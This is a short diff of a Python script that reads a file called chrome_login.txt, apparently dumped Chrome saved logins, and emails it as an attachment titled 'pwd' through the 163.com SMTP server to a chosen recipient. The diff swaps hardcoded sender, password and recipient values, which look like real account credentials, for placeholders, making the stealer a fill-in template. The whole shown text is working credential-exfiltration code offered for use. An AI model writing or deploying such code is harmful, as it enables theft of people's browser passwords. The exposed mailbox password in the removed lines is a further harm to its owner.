@@ -6,9 +6,10 @@ from email.mime.text import MIMEText
 
 def email():
   msg = MIMEMultipart()
-  _user = "13924089163@163.com"
-  _pw = "huguohao123"
-  _to = "168418909@qq.com"
+  #enter email
+  _user = "your email"
+  _pw = "email_1's password"
+  _to = "your target email"
   #构造附件
   att1 = MIMEText(open('D:\\chrome_login.txt','rb').read(),'base64','gb2312')
   att1["Content-Type"] = "application/octet-stream"
@@ -21,6 +22,7 @@ def email():
   msg['subject'] = 'pwd'
 
   try:
+    #your email server setting
   	server = smtplib.SMTP('smtp.163.com',25)
   	server.connect('smtp.163.com',25)
   	server.login(_user,_pw)
